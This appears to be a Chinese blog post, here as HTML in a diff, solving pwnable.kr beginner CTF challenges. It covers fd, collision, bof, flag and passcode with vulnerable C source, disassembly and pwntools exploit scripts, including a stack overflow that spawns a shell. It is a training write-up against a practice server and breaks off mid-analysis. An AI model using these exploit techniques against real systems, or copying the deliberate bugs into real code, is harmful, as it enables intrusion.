@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Pwnable
+[Toddler&rsquo;s Bottle]
+本文提供了pwnable.kr中题目的简要源码分析与漏洞分析，其连接方式是SSH连接，推荐使用Ubuntu等Linux环境。复制粘贴其题目下的命令，输入密码即可。如果弹出了SSH密钥相关的安全性提示，输入y或yes同意即可。
+01. fd
+
+Mommy! what is a file descriptor in Linux?
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+        if(argc&lt;2){
+                printf(&#34;pass argv[1] a number\n&#34;);
+                return 0;
+        }
+        int fd = atoi( argv[1] ) - 0x1234;
+        int len = 0;
+        len = read(fd, buf, 32);
+        if(!strcmp(&#34;LETMEWIN\n&#34;, buf)){
+                printf(&#34;good job :)\n&#34;);
+                system(&#34;/bin/cat flag&#34;);
+                exit(0);
+        }
+        printf(&#34;learn about Linux file IO\n&#34;);
+        return 0;
+
+}
+
+Linux中的文件描述符（fd）
+我们知道在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。
+文件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4&hellip;&hellip;
+Linux内核对所有打开的文件有一个文件描述符表格，里面存储了每个文件描述符作为索引与一个打开文件相对应的关系，简单理解就是下图这样一个数组，文件描述符（索引）就是文件描述符表这个数组的下标，数组的内容就是指向一个个打开的文件的指针。
+
+简单分析代码，当buf变量等于“LETMEWIN“时，可以得到flag，buf变量是read函数的参数，如果想要read函数能够从键盘输入中获取字符，那么这道题就变得很简单了。另外，程序在接收用户输入时使用了启动参数，在启动参数小于2（也就是无启动参数）时，程序会直接退出。
+
+  
+      
+          fd
+          对应的文件
+      
+  
+  
+      
+          0
+          stdin
+      
+      
+          1
+          stdout
+      
+      
+          2
+          stderr
+      
+      
+          &hellip;
+          &hellip;
+      
+  
+
+0x1234转换为十进制是4660，程序启动参数输入4660，遇到read函数从输入获取内容时输入LETMEWIN，即可得到flag。">  
+
+  <title>
+    
+      Pwnable
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.9c8cada0c1fe6aa55e013d8d7dd0c9ad7851306e94bcab61d994f9f1e3feac1e9e04590448ff7b850ed4ec4f38be7f41983213fb33ead3e467276082e379c0c0.css" integrity="sha512-nIytoMH&#43;aqVeAT2NfdDJrXhRMG6UvKth2ZT58eP&#43;rB6eBFkESP97hQ7U7E84vn9BmDIT&#43;zPq0&#43;RnJ2CC43nAwA==" />
+  
+</head>
+<body a="auto">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">..</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2024-11-23 00:00:00 &#43;0800 CST">
+            2024-11-23
+        </time>
+    </p>
+
+    <h1>Pwnable</h1>
+
+    
+
+    <h1 id="pwnable">Pwnable</h1>
+<h1 id="toddlers-bottle">[Toddler&rsquo;s Bottle]</h1>
+<p>本文提供了pwnable.kr中题目的简要源码分析与漏洞分析，其连接方式是SSH连接，推荐使用Ubuntu等Linux环境。复制粘贴其题目下的命令，输入密码即可。如果弹出了SSH密钥相关的安全性提示，输入y或yes同意即可。</p>
+<h2 id="01-fd">01. fd</h2>
+<blockquote>
+<p>Mommy! what is a file descriptor in Linux?</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[], <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> envp[]){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(argc<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;pass argv[1] a number</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>( argv[<span style="color:#ae81ff">1</span>] ) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1234</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        len <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(fd, buf, <span style="color:#ae81ff">32</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#34;LETMEWIN</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buf)){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;good job :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/cat flag&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;learn about Linux file IO</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><blockquote>
+<h2 id="linux中的文件描述符fd">Linux中的文件描述符（fd）</h2>
+<p>我们知道在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。</p>
+<p>文件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4&hellip;&hellip;</p>
+<p>Linux内核对所有打开的文件有一个文件描述符表格，里面存储了每个文件描述符作为索引与一个打开文件相对应的关系，简单理解就是下图这样一个数组，文件描述符（索引）就是文件描述符表这个数组的下标，数组的内容就是指向一个个打开的文件的指针。</p>
+</blockquote>
+<p>简单分析代码，当buf变量等于“LETMEWIN“时，可以得到flag，buf变量是read函数的参数，如果想要read函数能够从键盘输入中获取字符，那么这道题就变得很简单了。另外，程序在接收用户输入时使用了启动参数，在启动参数小于2（也就是无启动参数）时，程序会直接退出。</p>
+<table>
+  <thead>
+      <tr>
+          <th>fd</th>
+          <th>对应的文件</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>0</td>
+          <td>stdin</td>
+      </tr>
+      <tr>
+          <td>1</td>
+          <td>stdout</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>stderr</td>
+      </tr>
+      <tr>
+          <td>&hellip;</td>
+          <td>&hellip;</td>
+      </tr>
+  </tbody>
+</table>
+<p>0x1234转换为十进制是4660，程序启动参数输入4660，遇到read函数从输入获取内容时输入LETMEWIN，即可得到flag。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> make_packer(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> ssh(user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fd&#39;</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pwnable.kr&#39;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">2222</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4660&#39;</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>process(executable<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./fd&#39;</span>, argv<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;col&#39;</span>, payload])
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LETMEWIN&#39;</span>)
+</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recvall())
+</span></span></code></pre></div><h2 id="02-collision">02. collision</h2>
+<blockquote>
+<p>Daddy told me about cool MD5 hash collision today.
+I wanna do something like that too!</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> hashcode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x21DD09EC</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">check_password</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> p){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> ip <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)p;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> res<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">5</span>; i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>                res <span style="color:#f92672">+=</span> ip[i];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(argc<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;usage : %s [passcode]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>(argv[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">20</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;passcode length should be 20 bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(hashcode <span style="color:#f92672">==</span> <span style="color:#a6e22e">check_password</span>( argv[<span style="color:#ae81ff">1</span>] )){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/cat flag&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;wrong passcode.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>与第一题类似，输入仍然使用启动参数，在check_password函数中，函数接收argv并把其作为int类型读取，读取后将五个数求和，如果和等于hashcode即可得到flag。</p>
+<p>思路是，把hashcode除以5保留整数，然后取hashcode除以5的余数，把五个数加起来即可得到</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> make_packer(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> ssh(user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;col&#39;</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pwnable.kr&#39;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">2222</span>)
+</span></span><span style="display:flex;"><span>hashcode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x21DD09EC</span>
+</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> hashcode <span style="color:#f92672">//</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>end <span style="color:#f92672">=</span> num <span style="color:#f92672">+</span> hashcode <span style="color:#f92672">%</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p(num) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p(end)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>process(executable<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./col&#39;</span>, argv<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;col&#39;</span>, payload])
+</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recvall())
+</span></span></code></pre></div><h2 id="03-bof">03. bof</h2>
+<blockquote>
+<p>Nana told me that buffer overflow is one of the most common software vulnerability.
+Is that true?</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">func</span>(<span style="color:#66d9ef">int</span> key){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> overflowme[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;overflow me : &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gets</span>(overflowme);	<span style="color:#75715e">// smash me!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(key <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xcafebabe</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Nah..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">func</span>(<span style="color:#ae81ff">0xdeadbeef</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><pre tabindex="0"><code>-0000002E                 db ? ; undefined
+-0000002D                 db ? ; undefined
+-0000002C s (overflowme)  db 32 dup(?)
+-0000000C var_C           dd ?
+-00000008                 db ? ; undefined
+-00000007                 db ? ; undefined
+-00000006                 db ? ; undefined
+-00000005                 db ? ; undefined
+-00000004                 db ? ; undefined
+-00000003                 db ? ; undefined
+-00000002                 db ? ; undefined
+-00000001                 db ? ; undefined
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008 arg_0           dd ?
++0000000C
++0000000C ; end of stack variables
+</code></pre><p>使用ida简单看一下，函数参数在32位下于函数调用前会被pop进栈，所以func的参数key会在返回地址之前，overflowme大小0x32，加上ebp和返回地址之后即可覆盖掉key。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> make_packer(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwnable.kr&#39;</span>, <span style="color:#ae81ff">9000</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x2c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> p(<span style="color:#ae81ff">0xcafebabe</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cat flag&#39;</span>)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recv())
+</span></span></code></pre></div><h2 id="04-flag">04. flag</h2>
+<blockquote>
+<p>Papa brought me a packed present! let&rsquo;s open it.</p>
+</blockquote>
+<p>本题无源代码，是一个简单的逆向题，程序有壳，使用upx解压即可。</p>
+<pre tabindex="0"><code>sudo apt install upx
+upx -d ./flag
+</code></pre><p>之后使用ida分析，查找跟踪flag变量即可。</p>
+<p><img src="https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230326232448028.png" alt="image-20230326232448028"></p>
+<p><img src="https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230326232503763.png" alt="image-20230326232503763"></p>
+<p><img src="https://typora-1256197903.cos.ap-beijing.myqcloud.com/typora/image-20230326232517866.png" alt="image-20230326232517866"></p>
+<h2 id="05-passcode">05. passcode</h2>
+<blockquote>
+<p>Mommy told me to make a passcode based login system.
+My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">login</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> passcode1;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> passcode2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;enter passcode1 : &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, passcode1);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fflush</span>(stdin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;enter passcode2 : &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, passcode2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;checking...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(passcode1<span style="color:#f92672">==</span><span style="color:#ae81ff">338150</span> <span style="color:#f92672">&amp;&amp;</span> passcode2<span style="color:#f92672">==</span><span style="color:#ae81ff">13371337</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Login OK!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/cat flag&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Login Failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">welcome</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;enter you name : &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%100s&#34;</span>, name);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Welcome %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">welcome</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">login</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// something after login...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Now I can safely trust you that you have credential :)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这个程序脱离了其本意，在输入passcode1和passcode2时，并未对变量加取地址符号，反而直接把未初始化的变量作为了scanf函数的地址。</p>
+<p>现在来看下main函数的反汇编</p>
+<pre tabindex="0"><code>.text:08048665 ; __unwind {
+.text:08048665                 push    ebp
+.text:08048666                 mov     ebp, esp
+.text:08048668                 and     esp, 0FFFFFFF0h
+.text:0804866B                 sub     esp, 10h
+.text:0804866E                 mov     dword ptr [esp], offset aToddlerSSecure ; &#34;Toddler&#39;s Secure Login System 1.0 beta.&#34;
+.text:08048675                 call    _puts
+.text:0804867A                 call    welcome
+.text:0804867F                 call    login
+.text:08048684                 mov     dword ptr [esp], offset aNowICanSafelyT ; &#34;Now I can safely trust you that you hav&#34;...
+.text:0804868B                 call    _puts
+.text:08048690                 mov     eax, 0
+.text:08048695                 leave
+.text:08048696                 retn
+.text:08048696 ; } // starts at 8048665
+</code></pre><p>在main函数中，对welcome和login的调用是连续调用，导致了两个函数中ebp的值是相同的。</p>
+<pre tabindex="0"><code>.text:08048609 var_70          = byte ptr -70h
+.text:08048609 var_C           = dword ptr -0Ch
+.text:08048609
+.text:08048609 ; __unwind {
+.text:08048609                 push    ebp
+.text:0804860A                 mov     ebp, esp
+.text:0804860C                 sub     esp, 88h
+.text:08048612                 mov     eax, large gs:14h
+.text:08048618                 mov     [ebp+var_C], eax
+.text:0804861B                 xor     eax, eax
+.text:0804861D                 mov     eax, offset aEnterYouName ; &#34;enter you name : &#34;
+.text:08048622                 mov     [esp], eax      ; format
+.text:08048625                 call    _printf
+.text:0804862A                 mov     eax, offset a100s ; &#34;%100s&#34;
+.text:0804862F                 lea     edx, [ebp+var_70]
+.text:08048632                 mov     [esp+4], edx
+.text:08048636                 mov     [esp], eax
+.text:08048639                 call    ___isoc99_scanf
+.text:0804863E                 mov     eax, offset aWelcomeS ; &#34;Welcome %s!\n&#34;
+.text:08048643                 lea     edx, [ebp+var_70]
+.text:08048646                 mov     [esp+4], edx
+.text:0804864A                 mov     [esp], eax      ; format
+.text:0804864D                 call    _printf
+.text:08048652                 mov     eax, [ebp+var_C]
+.text:08048655                 xor     eax, large gs:14h
+.text:0804865C                 jz      short locret_8048663
